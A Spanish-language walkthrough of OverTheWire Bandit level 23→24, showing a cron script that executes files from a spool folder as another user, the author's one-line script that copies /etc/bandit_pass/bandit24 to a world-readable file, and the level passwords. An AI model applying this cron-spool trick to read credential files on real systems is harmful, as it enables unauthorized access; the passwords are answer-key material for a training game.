# Bandit Level 23 → Level 24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso
usuario: **bandit23**
Servidor **bandit.labs.overthewire.org**
Puerto de acceso **2220**
Contraseña:  ==**QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G **==
Contraseña obtenida en el [[Nivel 22 - 23]].

## Solución
Se analiza el script almacenado en la carpeta de cron,
``` bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24                                @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null                         * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null                       bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh                                /bin/bash                                                                                                                                                           myname=$(whoami)                                                                                                                                                      cd /var/spool/$myname/foo                                                          echo "Executing and deleting all scripts in /var/spool/$myname/foo:"               for i in * .*;                                                                     do                                                                                     if [ "$i" != "." -a "$i" != ".." ];                                                then                                                                                   echo "Handling $i"                                                                 owner="$(stat --format "%U" ./$i)"                                                 if [ "${owner}" = "bandit23" ]; then                                                   timeout -s 9 60 ./$i                                                           fi                                                                                 rm -f ./$i                                                                     fi                                                                             done                                                                                                                                                                  bandit23@bandit:~$       
```
Se debe crear un script que se ejecute con el script mostado arriba.
``` bash

bandit23@bandit:/tmp/ilvartoxd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/ilvartoxd/password"                                                                        cat /etc/bandit_pass/bandit24 > /tmp/ilvartoxd/password                            bandit23@bandit:/tmp/ilvartoxd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/ilvartoxd/password" > ilvarto.sh                                                           bandit23@bandit:/tmp/ilvartoxd$ cat ilvarto.sh                                     cat /etc/bandit_pass/bandit24 > /tmp/ilvartoxd/password                            bandit23@bandit:/tmp/ilvartoxd$ chmod 777 ilvarto.sh                               bandit23@bandit:/tmp/ilvartoxd$ touch password                                     bandit23@bandit:/tmp/ilvartoxd$ chmod 666 password                                 bandit23@bandit:/tmp/ilvartoxd$ ls -la                                             total 192                                                                          drwxrwxr-x    2 bandit23 bandit23   4096 Sep  6 13:32 .                            drwxrwx-wt 4821 root     root     184320 Sep  6 13:31 ..                           -rwxrwxrwx    1 bandit23 bandit23     56 Sep  6 13:31 ilvarto.sh                   -rw-rw-rw-    1 bandit23 bandit23      0 Sep  6 13:32 password
```
Se crea el script para obtener contraseña, en una carpeta temporal.
``` bash
bandit23@bandit:/tmp/ilvartoxd$ cp ilvarto.sh /var/spool/bandit24/foo              bandit23@bandit:/tmp/ilvartoxd$ date
Tue Sep  6 01:35:01 PM UTC 2022
bandit23@bandit:/tmp/ilvartoxd$ date                                               Tue Sep  6 01:36:05 PM UTC 2022 
bandit23@bandit:/tmp/ilvartoxd$ cat password                                       VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
Contraseña ==**VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar **==

## Notas adicionales

## Referencias
